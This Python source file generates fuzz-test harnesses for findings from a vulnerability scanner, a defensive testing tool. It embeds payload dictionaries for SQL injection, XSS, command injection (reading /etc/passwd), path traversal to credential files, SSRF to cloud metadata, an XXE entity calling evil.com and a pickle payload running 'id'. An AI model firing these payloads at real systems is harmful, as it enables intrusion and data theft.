#!/usr/bin/env python3
"""Fuzzer harness generator for Owen.

Given findings from detect.py or attack_surface42, generates fuzz test
harnesses for each discovered endpoint / vulnerability site. Supports
Python (hypothesis), JavaScript (fast-check), Java (JQF), and generic
HTTP fuzzing.

Usage:
    gen = FuzzerGen()
    harnesses = gen.from_findings(findings)
    for h in harnesses:
        print(h.code)
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any

VERSION = "4.2"


# =========================================================================== #
#  DATA TYPES                                                                  #
# =========================================================================== #

class FuzzTarget(Enum):
    HTTP_ENDPOINT = auto()
    FUNCTION_CALL = auto()
    FILE_PARSER = auto()
    DESERIALIZER = auto()
    QUERY_BUILDER = auto()
    COMMAND_EXEC = auto()
    TEMPLATE_RENDER = auto()
    XML_PARSER = auto()
    JSON_PARSER = auto()
    AUTH_HANDLER = auto()


class FuzzStrategy(Enum):
    MUTATION = "mutation"
    GENERATION = "generation"
    GRAMMAR = "grammar"
    DICTIONARY = "dictionary"


CWE_FUZZ_TARGET: dict[int, FuzzTarget] = {
    89: FuzzTarget.QUERY_BUILDER,
    79: FuzzTarget.HTTP_ENDPOINT,
    78: FuzzTarget.COMMAND_EXEC,
    94: FuzzTarget.TEMPLATE_RENDER,
    22: FuzzTarget.FILE_PARSER,
    23: FuzzTarget.FILE_PARSER,
    502: FuzzTarget.DESERIALIZER,
    611: FuzzTarget.XML_PARSER,
    434: FuzzTarget.FILE_PARSER,
    306: FuzzTarget.AUTH_HANDLER,
    862: FuzzTarget.AUTH_HANDLER,
    113: FuzzTarget.HTTP_ENDPOINT,
    120: FuzzTarget.FUNCTION_CALL,
    134: FuzzTarget.FUNCTION_CALL,
    190: FuzzTarget.FUNCTION_CALL,
    400: FuzzTarget.HTTP_ENDPOINT,
    918: FuzzTarget.HTTP_ENDPOINT,
    1321: FuzzTarget.JSON_PARSER,
}

CWE_STRATEGY: dict[int, FuzzStrategy] = {
    89: FuzzStrategy.GRAMMAR,
    79: FuzzStrategy.DICTIONARY,
    78: FuzzStrategy.DICTIONARY,
    94: FuzzStrategy.GRAMMAR,
    22: FuzzStrategy.DICTIONARY,
    502: FuzzStrategy.MUTATION,
    611: FuzzStrategy.GRAMMAR,
    120: FuzzStrategy.MUTATION,
    134: FuzzStrategy.DICTIONARY,
    400: FuzzStrategy.MUTATION,
    1321: FuzzStrategy.GRAMMAR,
}


@dataclass
class FuzzInput:
    """A single fuzz input specification."""
    name: str
    input_type: str = "string"
    constraints: str = ""
    dictionary: list[str] = field(default_factory=list)
    grammar: str = ""


@dataclass
class FuzzHarness:
    """A generated fuzz test harness."""
    name: str
    target_file: str
    target_line: int
    cwe: int
    language: str
    target_type: FuzzTarget
    strategy: FuzzStrategy
    inputs: list[FuzzInput]
    code: str
    setup_code: str = ""
    teardown_code: str = ""
    timeout_ms: int = 5000
    max_iterations: int = 10000

    @property
    def harness_id(self) -> str:
        return "%s_cwe%d_%s_%d" % (
            self.language, self.cwe,
            re.sub(r"[^a-z0-9]", "_", self.target_file.lower()),
            self.target_line)


# =========================================================================== #
#  DICTIONARIES                                                                #
# =========================================================================== #

SQLI_DICT = [
    "' OR '1'='1", "'; DROP TABLE users;--", "1 UNION SELECT NULL--",
    "admin'--", "' AND 1=1--", "1; WAITFOR DELAY '0:0:5'--",
    "' UNION SELECT username,password FROM users--",
    "1' ORDER BY 1--", "') OR ('1'='1", "1 AND 1=CONVERT(int,@@version)--",
]

XSS_DICT = [
    '<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>', "javascript:alert(1)",
    '<svg onload=alert(1)>', '{{7*7}}', '${7*7}',
    '<iframe src="javascript:alert(1)">', '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
]

CMDI_DICT = [
    "; id", "| cat /etc/passwd", "$(whoami)", "`id`",
    "& dir", "| type C:\\windows\\win.ini", "'; exec('id');#",
    "\nid\n", "$(sleep 5)", "; ping -c 3 127.0.0.1",
]

PATH_DICT = [
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd", "/etc/shadow",
    "....\\....\\windows\\system32\\config\\sam",
    "%00../../../../etc/passwd", "file:///etc/passwd",
]

FORMAT_DICT = [
    "%s%s%s%s%s", "%x%x%x%x", "%n%n%n%n", "%p%p%p%p",
    "AAAA%08x.%08x.%08x", "%d" * 50, "%s" * 100,
]

PROTO_POLLUTION_DICT = [
    '{"__proto__":{"polluted":true}}',
    '{"constructor":{"prototype":{"polluted":true}}}',
    '{"__proto__":{"toString":"polluted"}}',
    '{"__proto__":{"isAdmin":true}}',
]

SSRF_DICT = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80", "http://[::1]",
    "http://0x7f000001", "http://localhost:22",
    "http://metadata.google.internal/",
    "file:///etc/passwd", "gopher://127.0.0.1:25/",
]

XXE_DICT = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
]

DESER_DICT = [
    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
    'O:8:"stdClass":0:{}',
    "cos\nsystem\n(S'id'\ntR.",
]

CWE_DICTIONARY: dict[int, list[str]] = {
    89: SQLI_DICT,
    79: XSS_DICT,
    80: XSS_DICT,
    78: CMDI_DICT,
    22: PATH_DICT,
    23: PATH_DICT,
    36: PATH_DICT,
    134: FORMAT_DICT,
    1321: PROTO_POLLUTION_DICT,
    918: SSRF_DICT,
    611: XXE_DICT,
    502: DESER_DICT,
}


# =========================================================================== #
#  CODE GENERATORS                                                             #
# =========================================================================== #

def _python_http_harness(finding: dict, inputs: list[FuzzInput],
                         dictionary: list[str]) -> str:
    endpoint = finding.get("endpoint", "/api/endpoint")
    method = finding.get("method", "GET")
    param = inputs[0].name if inputs else "input"

    dict_str = ",\n        ".join('"%s"' % d.replace('"', '\\"') for d in dictionary[:8])

    return (
        '"""Fuzz harness for CWE-%d at %s:%d\n'
        'Target: %s %s\n'
        '"""\n'
        'import hypothesis\n'
        'from hypothesis import given, strategies as st, settings\n'
        'import requests\n'
        '\n'
        'BASE_URL = "http://localhost:8080"\n'
        '\n'
        'FUZZ_DICT = [\n'
        '        %s\n'
        ']\n'
        '\n'
        'fuzz_strat = st.one_of(\n'
        '    st.sampled_from(FUZZ_DICT),\n'
        '    st.text(min_size=1, max_size=500),\n'
        '    st.binary(min_size=1, max_size=200).map(lambda b: b.decode("latin-1")),\n'
        ')\n'
        '\n'
        '@settings(max_examples=1000, deadline=5000)\n'
        '@given(payload=fuzz_strat)\n'
        'def test_fuzz_%s(payload):\n'
        '    """Fuzz %s %s with CWE-%d payloads."""\n'
        '    try:\n'
        '        if "%s" == "GET":\n'
        '            r = requests.get(BASE_URL + "%s", params={"%s": payload}, timeout=5)\n'
        '        else:\n'
        '            r = requests.post(BASE_URL + "%s", data={"%s": payload}, timeout=5)\n'
        '        assert r.status_code < 500, "Server error: %%d" %% r.status_code\n'
        '    except requests.exceptions.ConnectionError:\n'
        '        pass\n'
        '\n'
        'if __name__ == "__main__":\n'
        '    test_fuzz_%s()\n'
    ) % (
        finding.get("cwe", 0), finding.get("file_path", "unknown"), finding.get("line", 0),
        method, endpoint,
        dict_str,
        param, method, endpoint, finding.get("cwe", 0),
        method, endpoint, param,
        endpoint, param,
        param,
    )


def _python_func_harness(finding: dict, inputs: list[FuzzInput],
                         dictionary: list[str]) -> str:
    func_name = finding.get("function", "target_function")
    module = finding.get("file_path", "module").replace(".py", "").replace("/", ".").replace("\\", ".")

    dict_str = ",\n        ".join('"%s"' % d.replace('"', '\\"') for d in dictionary[:6])

    return (
        '"""Fuzz harness for CWE-%d at %s:%d\n'
        'Target: %s()\n'
        '"""\n'
        'from hypothesis import given, strategies as st, settings\n'
        '\n'
        'FUZZ_DICT = [\n'
        '        %s\n'
        ']\n'
        '\n'
        'fuzz_strat = st.one_of(\n'
        '    st.sampled_from(FUZZ_DICT),\n'
        '    st.text(min_size=0, max_size=1000),\n'
        '    st.integers(min_value=-2**31, max_value=2**31),\n'
        '    st.binary(min_size=0, max_size=500),\n'
        ')\n'
        '\n'
        '@settings(max_examples=5000, deadline=5000)\n'
        '@given(data=fuzz_strat)\n'
        'def test_fuzz_%s(data):\n'
        '    """Fuzz %s with CWE-%d payloads."""\n'
        '    try:\n'
        '        from %s import %s\n'
        '        result = %s(data)\n'
        '    except (ValueError, TypeError, OverflowError):\n'
        '        pass\n'
        '    except Exception as e:\n'
        '        if "segfault" in str(e).lower() or "buffer" in str(e).lower():\n'
        '            raise\n'
        '\n'
        'if __name__ == "__main__":\n'
        '    test_fuzz_%s()\n'
    ) % (
        finding.get("cwe", 0), finding.get("file_path", "unknown"), finding.get("line", 0),
        func_name,
        dict_str,
        func_name, func_name, finding.get("cwe", 0),
        module, func_name,
        func_name,
        func_name,
    )


def _js_http_harness(finding: dict, inputs: list[FuzzInput],
                     dictionary: list[str]) -> str:
    endpoint = finding.get("endpoint", "/api/endpoint")
    param = inputs[0].name if inputs else "input"

    dict_str = ",\n    ".join('"%s"' % d.replace('"', '\\"') for d in dictionary[:8])

    return (
        '/**\n'
        ' * Fuzz harness for CWE-%d at %s:%d\n'
        ' */\n'
        'const fc = require("fast-check");\n'
        'const axios = require("axios");\n'
        '\n'
        'const BASE_URL = "http://localhost:3000";\n'
        'const FUZZ_DICT = [\n'
        '    %s\n'
        '];\n'
        '\n'
        'const fuzzArb = fc.oneof(\n'
        '    fc.constantFrom(...FUZZ_DICT),\n'
        '    fc.string({minLength: 1, maxLength: 500}),\n'
        '    fc.uint8Array({minLength: 1, maxLength: 200}).map(b => Buffer.from(b).toString("latin1")),\n'
        ');\n'
        '\n'
        'describe("Fuzz CWE-%d %s", () => {\n'
        '    it("should not crash with fuzz input", async () => {\n'
        '        await fc.assert(\n'
        '            fc.asyncProperty(fuzzArb, async (payload) => {\n'
        '                try {\n'
        '                    const resp = await axios.get(`${BASE_URL}%s`, {\n'
        '                        params: {%s: payload},\n'
        '                        timeout: 5000,\n'
        '                        validateStatus: () => true,\n'
        '                    });\n'
        '                    return resp.status < 500;\n'
        '                } catch (e) {\n'
        '                    if (e.code === "ECONNREFUSED") return true;\n'
        '                    throw e;\n'
        '                }\n'
        '            }),\n'
        '            {numRuns: 500}\n'
        '        );\n'
        '    });\n'
        '});\n'
    ) % (
        finding.get("cwe", 0), finding.get("file_path", "unknown"), finding.get("line", 0),
        dict_str,
        finding.get("cwe", 0), endpoint,
        endpoint, param,
    )


def _java_harness(finding: dict, inputs: list[FuzzInput],
                  dictionary: list[str]) -> str:
    class_name = "Fuzz_CWE_%d_%d" % (finding.get("cwe", 0), finding.get("line", 0))

    dict_str = ",\n            ".join('"%s"' % d.replace('"', '\\"') for d in dictionary[:6])

    return (
        '/**\n'
        ' * JQF fuzz harness for CWE-%d at %s:%d\n'
        ' */\n'
        'import edu.berkeley.cs.jqf.fuzz.Fuzz;\n'
        'import edu.berkeley.cs.jqf.fuzz.JQF;\n'
        'import org.junit.runner.RunWith;\n'
        'import com.pholser.junit.quickcheck.From;\n'
        'import com.pholser.junit.quickcheck.generator.GenerationStatus;\n'
        'import com.pholser.junit.quickcheck.generator.Generator;\n'
        'import com.pholser.junit.quickcheck.random.SourceOfRandomness;\n'
        '\n'
        '@RunWith(JQF.class)\n'
        'public class %s {\n'
        '\n'
        '    private static final String[] DICT = {\n'
        '            %s\n'
        '    };\n'
        '\n'
        '    @Fuzz\n'
        '    public void fuzz(String input) {\n'
        '        try {\n'
        '            // Insert target function call with fuzzed input\n'
        '            processInput(input);\n'
        '        } catch (IllegalArgumentException | NullPointerException e) {\n'
        '            // Expected for malformed input\n'
        '        }\n'
        '    }\n'
        '\n'
        '    private void processInput(String input) {\n'
        '        // Target: %s:%d\n'
        '        // Replace with actual target call\n'
        '        if (input != null && input.length() > 0) {\n'
        '            input.charAt(0);\n'
        '        }\n'
        '    }\n'
        '}\n'
    ) % (
        finding.get("cwe", 0), finding.get("file_path", "unknown"), finding.get("line", 0),
        class_name,
        dict_str,
        finding.get("file_path", "unknown"), finding.get("line", 0),
    )


def _generic_http_harness(finding: dict, inputs: list[FuzzInput],
                          dictionary: list[str]) -> str:
    endpoint = finding.get("endpoint", "/api/endpoint")
    param = inputs[0].name if inputs else "input"

    dict_str = "\n".join(d for d in dictionary[:10])

    return (
        '#!/bin/bash\n'
        '# Fuzz harness for CWE-%d at %s:%d\n'
        '# Generic HTTP fuzzer using curl\n'
        '\n'
        'BASE_URL="${1:-http://localhost:8080}"\n'
        'ENDPOINT="%s"\n'
        'PARAM="%s"\n'
        'TIMEOUT=5\n'
        'MAX_ITER=${2:-1000}\n'
        '\n'
        '# Dictionary payloads\n'
        'DICT=(\n'
        '%s\n'
        ')\n'
        '\n'
        'echo "=== Fuzzing $BASE_URL$ENDPOINT (CWE-%d) ==="\n'
        'echo "Parameter: $PARAM"\n'
        'echo "Max iterations: $MAX_ITER"\n'
        'echo ""\n'
        '\n'
        'CRASHES=0\n'
        'ERRORS=0\n'
        '\n'
        'for i in $(seq 1 $MAX_ITER); do\n'
        '    if [ $i -le ${#DICT[@]} ]; then\n'
        '        PAYLOAD="${DICT[$i-1]}"\n'
        '    else\n'
        '        PAYLOAD=$(head -c $((RANDOM %% 200 + 1)) /dev/urandom | base64)\n'
        '    fi\n'
        '\n'
        '    HTTP_CODE=$(curl -s -o /dev/null -w "%%{http_code}" \\\n'
        '        --max-time $TIMEOUT \\\n'
        '        "$BASE_URL$ENDPOINT?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\\\"$PAYLOAD\\\"))")" \\\n'
        '        2>/dev/null)\n'
        '\n'
        '    if [ "$HTTP_CODE" -ge 500 ] 2>/dev/null; then\n'
        '        ERRORS=$((ERRORS + 1))\n'
        '        echo "[ITER $i] SERVER ERROR $HTTP_CODE with payload: $PAYLOAD"\n'
        '    elif [ "$HTTP_CODE" = "000" ]; then\n'
        '        CRASHES=$((CRASHES + 1))\n'
        '        echo "[ITER $i] CONNECTION FAILED (possible crash) with payload: $PAYLOAD"\n'
        '    fi\n'
        'done\n'
        '\n'
        'echo ""\n'
        'echo "=== Results ==="\n'
        'echo "Iterations: $MAX_ITER"\n'
        'echo "Server errors: $ERRORS"\n'
        'echo "Connection failures: $CRASHES"\n'
    ) % (
        finding.get("cwe", 0), finding.get("file_path", "unknown"), finding.get("line", 0),
        endpoint, param,
        dict_str,
        finding.get("cwe", 0),
    )


# =========================================================================== #
#  FUZZER GENERATOR                                                            #
# =========================================================================== #

class FuzzerGen:
    """Generates fuzz test harnesses from findings."""

    def __init__(self):
        self._harnesses: list[FuzzHarness] = []

    def from_finding(self, finding: dict[str, Any]) -> FuzzHarness | None:
        finding = dict(finding)
        cwe = finding.get("cwe", 0)
        if isinstance(cwe, str):
            m = re.search(r"(\d+)", cwe)
            cwe = int(m.group(1)) if m else 0
        finding["cwe"] = cwe

        language = finding.get("language", "python").lower()
        target_type = CWE_FUZZ_TARGET.get(cwe, FuzzTarget.FUNCTION_CALL)
        strategy = CWE_STRATEGY.get(cwe, FuzzStrategy.MUTATION)
        dictionary = CWE_DICTIONARY.get(cwe, [])

        param_name = finding.get("param", finding.get("parameter", "input"))
        inputs = [FuzzInput(
            name=param_name,
            input_type="string",
            dictionary=dictionary,
        )]

        if language in ("python", "py"):
            has_endpoint = finding.get("endpoint") or target_type in (
                FuzzTarget.HTTP_ENDPOINT, FuzzTarget.AUTH_HANDLER)
            if has_endpoint:
                code = _python_http_harness(finding, inputs, dictionary)
            else:
                code = _python_func_harness(finding, inputs, dictionary)
        elif language in ("javascript", "js", "typescript", "ts"):
            code = _js_http_harness(finding, inputs, dictionary)
        elif language in ("java",):
            code = _java_harness(finding, inputs, dictionary)
        else:
            code = _generic_http_harness(finding, inputs, dictionary)

        harness = FuzzHarness(
            name="fuzz_cwe_%d_%s_%d" % (
                cwe, re.sub(r"[^a-z0-9]", "_",
                            finding.get("file_path", "unknown").lower()),
                finding.get("line", 0)),
            target_file=finding.get("file_path", "unknown"),
            target_line=finding.get("line", 0),
            cwe=cwe,
            language=language,
            target_type=target_type,
            strategy=strategy,
            inputs=inputs,
            code=code,
        )
        self._harnesses.append(harness)
        return harness

    def from_findings(self, findings: list[dict[str, Any]]) -> list[FuzzHarness]:
        results = []
        for f in findings:
            h = self.from_finding(f)
            if h:
                results.append(h)
        return results

    @property
    def harnesses(self) -> list[FuzzHarness]:
        return list(self._harnesses)

    def summary(self) -> str:
        lines = [
            "=== Fuzzer Harness Generation ===",
            "Harnesses generated: %d" % len(self._harnesses),
        ]
        if self._harnesses:
            by_lang: dict[str, int] = {}
            by_cwe: dict[int, int] = {}
            for h in self._harnesses:
                by_lang[h.language] = by_lang.get(h.language, 0) + 1
                by_cwe[h.cwe] = by_cwe.get(h.cwe, 0) + 1

            lines.append("")
            lines.append("By language:")
            for lang, count in sorted(by_lang.items()):
                lines.append("  %s: %d" % (lang, count))

            lines.append("")
            lines.append("By CWE:")
            for cwe, count in sorted(by_cwe.items()):
                lines.append("  CWE-%d: %d" % (cwe, count))

        return "\n".join(lines)


def generate(findings: list[dict[str, Any]]) -> list[FuzzHarness]:
    gen = FuzzerGen()
    return gen.from_findings(findings)
